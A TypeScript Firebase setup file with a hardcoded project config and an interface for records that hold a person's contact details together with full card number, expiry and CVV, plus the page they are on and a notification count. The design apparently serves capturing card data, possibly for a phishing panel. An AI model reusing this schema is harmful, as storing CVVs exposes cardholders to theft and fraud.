import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyD2DWxuyywsRl1AjDv8cRWCixKIgN3nIno",
  authDomain: "handy-tiger-452502-u8.firebaseapp.com",
  databaseURL: "https://handy-tiger-452502-u8-default-rtdb.firebaseio.com",
  projectId: "handy-tiger-452502-u8",
  storageBucket: "handy-tiger-452502-u8.firebasestorage.app",
  messagingSenderId: "454232781530",
  appId: "1:454232781530:web:b387fd6c890376a682ebe3",
  measurementId: "G-VFPVJKPEZ0"};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

